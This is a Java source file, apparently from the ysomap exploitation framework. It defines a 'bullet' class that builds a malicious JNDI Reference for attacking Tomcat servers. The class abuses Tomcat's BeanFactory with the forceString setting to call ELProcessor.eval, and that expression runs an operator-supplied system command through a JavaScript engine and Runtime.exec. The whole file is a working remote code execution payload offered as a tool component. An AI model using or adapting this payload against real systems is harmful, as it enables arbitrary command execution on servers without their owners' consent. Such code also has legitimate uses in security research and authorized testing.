package ysomap.bullets.jdk.rmi;

import org.apache.naming.ResourceRef;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@Bullets
@Dependencies({"org.apache.tomcat:tomcat-catalina:xxx"})
@Details("JNDI Reference的一种，适用于攻击tomcat环境下的JNDI")
@Authors({Authors.WH1T3P1G, Authors.KINGX})
public class TomcatRefBullet implements Bullet<Reference> {

    @Require(name = "command", detail = "system command to execute")
    private String command;

    @Override
    public Reference getObject() throws Exception {
        ResourceRef ref = new ResourceRef(
                "javax.el.ELProcessor",
                null, "", "",
                true,"org.apache.naming.factory.BeanFactory",
                null);
        ref.add(new StringRefAddr("forceString", "KINGX=eval"));
        ref.add(new StringRefAddr("KINGX",
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                        ".newInstance().getEngineByName(\"JavaScript\")" +
                        ".eval(\"java.lang.Runtime.getRuntime().exec('"+command+"')\")"));
        return ref;
    }
}
